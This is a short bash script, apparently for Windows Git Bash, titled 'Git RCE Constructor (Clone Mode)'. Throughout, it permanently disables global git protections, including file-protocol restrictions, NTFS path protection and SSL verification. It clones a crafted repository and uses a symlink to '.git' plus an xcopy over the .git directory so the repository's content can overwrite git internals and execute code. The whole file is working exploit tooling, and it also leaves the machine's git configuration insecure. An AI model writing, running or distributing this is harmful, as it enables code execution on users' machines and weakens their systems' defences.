#!/bin/bash
set +x
error_handler(){
set +x
echo -n "Operation failed!"
read -N 1
exit 0
}
echo Git RCE Constructor v1.8.0 \(Clone Mode\)
echo -e "\033]0;Git RCE Constructor v1.8.0 (Clone Mode)\007"
echo Notice: This tool can only safely clone repositories created using Git RCE Constructor.
echo There is no guaranteed success for cloning repositories created using other tools!
read -r -p "Repository URL: " main_repo_path
set -x
git config --global protocol.file.allow always ||error_handler
git config --global core.protectNTFS false ||error_handler
git config --global http.sslVerify false ||error_handler
git config --global core.symlinks true ||error_handler
if [ -z "$(git config --global user.name)" ]; then
git config --global user.name "$USERNAME"
fi
if [ -z "$(git config --global user.email)" ]; then
git config --global user.email "$USERNAME"
fi
echo Cloning repo...
mkdir -p git_rce_main
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_main disable
fi
git clone --no-recursive "$main_repo_path" git_rce_main ||error_handler
cd git_rce_main
git rm gitlnk ||error_handler
git submodule update --init --recursive ||error_handler
git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk ||error_handler
xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
git reset --hard HEAD ||error_handler
set +x
echo All done!
echo -n "Press any key to continue..."
read -N 1
exit 0
